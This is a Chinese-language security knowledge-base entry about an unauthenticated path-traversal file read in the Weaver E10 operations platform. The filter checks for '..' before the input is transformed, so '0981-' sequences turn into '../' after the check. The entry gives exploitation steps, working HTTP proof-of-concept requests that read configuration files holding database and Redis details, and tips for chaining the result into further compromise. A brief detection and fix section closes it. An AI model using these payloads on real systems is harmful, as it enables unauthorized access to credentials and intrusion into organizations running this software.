---
id: web-generic-file-inclusion-weaver-e10-0981-dash-path-traversal-read
title: 泛微 E10 downloadFile/downloadMonitorSelfFile 的 0981- 编码路径穿越：未授权任意文件读取
type: scenario
domain: web
path: web/generic/file-inclusion
technique: weaver-e10-0981-dash-path-traversal-read
tags:
- java
- spring
- path-traversal
- arbitrary-file-read
- weaver
- ecology
- e10
- e-monitor
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V222
  verified_at: '2026-11-07T06:44:35+08:00'
  notes: 已对照原文 UIController.customDownload/customMonitorSelfDownload 反编译截图与两条读取请求响应核对：0981- 删除与 -→/ 变换、indexOf("..") 先检查后变换成立，两条 PoC 与原文一致。
url: /docs/web/generic/file-inclusion/web-generic-file-inclusion-weaver-e10-0981-dash-path-traversal-read/
draft: false
kb_aliases:
- 泛微 E10 任意文件读取
- downloadMonitorSelfFile 路径穿越
- downloadFile 0981 绕过
- 0981- 编码 ../
- e-monitor 文件读取
---

## 一句话结论

泛微 E10 运维平台的 `/cd/downloadFile/{operation:.+}` 与 `/cd/downloadMonitorSelfFile/{uuid}/{operation:.+}` 只用 `operation.indexOf("..") == -1` 拦截路径穿越，但随后对以 `0981-` 开头的 operation 执行 `replace("0981-", "")` 与 `replace("-", "/")`；攻击者用 `0981-.0981-.-config...` 这类输入即可在检查之后拼出 `../../`，未授权读取 Web 目录及相邻目录中的任意文件。

## 原理

- `customDownload`（`/cd/downloadFile/{operation:.+}`）逻辑：

```java
if (operation != null && operation.indexOf("..") == -1) {
    filepath = RuntimeUtil.getWebAppRootPath() + File.separator + "download" + File.separator + operation;
    if (operation.startsWith("0981-")) {
        filename = operation.replace("0981-", "");
        filename = filename.replace("-", "/");
        filepath = RuntimeUtil.getWebAppRootPath() + File.separator + filename;
    }
    File file = new File(filepath);
    ...
}
```

- `customMonitorSelfDownload`（`/cd/downloadMonitorSelfFile/{uuid}/{operation:.+}`）使用相同的 `0981-` 处理，只是基准目录为 `webAppRoot/uuid/`。
- 安全检查发生在字符串变换之前：输入中不能出现字面量 `..`，但 `0981-` 被删除后可以产生 `..`，`-` 被替换成 `/` 后可以产生路径分隔符；因此检查被完全绕过。
- 以 `customMonitorSelfDownload` 为例：`operation = 0981-.0981-.-config-apusic.configOptions.properties`：
  - 先删掉两处 `0981-`，得到 `..-config-apusic.configOptions.properties`；
  - 再把 `-` 换成 `/`，得到 `../../config-apusic.configOptions.properties`；
  - 最终 `filepath = webAppRoot/uuid/../../config...`，跳出 uuid 目录读取配置。
- `customDownload` 的 `0981--config-apusic.configOptions.properties`：删掉 `0981-` 得 `-config...`，`-`→`/` 得 `/config...`，最终读取 `webAppRoot/config...`。
- 读取的 `config-apusic.configOptions.properties` 含 redis/mongodb 等配置，可作为后续登录、横向或 RCE 的信息基础。

## 触发条件

- 目标为泛微 E10 运维管理平台（e-monitor，文章测试 Ecology10.0.2403.01，默认 9081 端口）。
- `/cd/downloadFile/**` 与 `/cd/downloadMonitorSelfFile/**` 在鉴权白名单中（`core-service.xml` 与 `WebSecurityConfig` 均放行），无需登录。
- 目标文件路径已知或可枚举（Web 根、`config-apusic.configOptions.properties`、日志、备份等）。

## 利用步骤

1. 先访问 `/cd/downloadMonitorSelfFile/a/0981-.0981-.-config-apusic.configOptions.properties`（`a` 为任意 uuid 段），观察是否返回配置文件内容。
2. 若路径层级不符，增减 `0981-.0981-` 的重复次数调整 `../` 数量（每两个 `0981-` 加 `-` 可产生一层 `../`）。
3. 也可用 `/cd/downloadFile/0981--config-apusic.configOptions.properties` 读取 Web 根下文件。
4. 读取配置/源码/日志后，提取数据库、Redis、内部服务地址等，衔接 JDBC 文件读取、命令执行或后台登录。

## PoC

```http
GET /cd/downloadMonitorSelfFile/a/0981-.0981-.-config-apusic.configOptions.properties HTTP/1.1
Host: target:9081
```

```http
GET /cd/downloadFile/0981--config-apusic.configOptions.properties HTTP/1.1
Host: target:9081
```

## 变体与关联

- **层数变体**：重复 `0981-.0981-.-` 可得到更多的 `../`；`-` 也可用于把任意路径段连接成 `/`。
- **其他下载点**：`/cd/downloadFile/**`、`/cd/downloadMonitorSelfFile/**` 都在白名单中；若目标版本修补其中一个，检查另一个是否仍使用相同 `0981-` 逻辑。
- **关联**：[[web-generic-file-inclusion-cdg-decryptapplication-filepath-read]]（同为“先检查后变换”的路径绕过）、[[web-java-framework-spring-weaver-e10-sapi-bs-wildcard-auth-bypass-admin]]（同一产品的全局鉴权绕过，可配合读取更多敏感文件）。

## 检测与防御

- **修复**：先做 `..`/绝对路径/分隔符规范化，再校验 `realpath` 必须位于允许的下载目录内；删除 `0981-` 这类“编码即变换”的兼容逻辑，或将其限制在固定文件名映射表内。
- **加固**：下载接口只允许固定扩展名与固定目录；敏感配置移出 Web 根；网关层限制下载接口访问来源。
- **检测**：监控请求路径中出现 `0981-`、连续 `-`、`..` 编码变体；审计下载接口返回非预期文件类型/大小的响应。
